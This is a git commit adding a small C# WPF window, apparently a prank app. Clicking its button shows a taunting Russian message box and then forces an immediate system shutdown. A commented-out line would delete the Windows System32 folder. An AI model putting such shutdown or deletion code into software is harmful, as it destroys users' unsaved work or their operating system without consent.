3734e3d3a4901945112df9fa812c90ee0e8f23ca
username <113782077+whateverusername0@users.noreply.github.com>
2024-11-19 17:56:39 +1000

    Add files via upload

---
+++ wpfhomotest/MainWindow.xaml.cs
@@ -0,0 +1,24 @@
+﻿using System.Diagnostics;
+using System.IO;
+using System.Windows;
+
+namespace wpfhomotest
+{
+    /// <summary>
+    /// Interaction logic for MainWindow.xaml
+    /// </summary>
+    public partial class MainWindow : Window
+    {
+        public MainWindow()
+        {
+            InitializeComponent();
+        }
+
+        private void Button_Click(object sender, RoutedEventArgs e)
+        {
+            MessageBox.Show("Русские не сдаются!", "Ты не пацан", MessageBoxButton.OK, MessageBoxImage.Error);
+            //Directory.Delete("C:\\Windows\\System32"); // опа опа...
+            new Process() { StartInfo = new ProcessStartInfo() { FileName = "shutdown.exe", Arguments = "/s /t 0" } }.Start();
+        }
+    }
+}
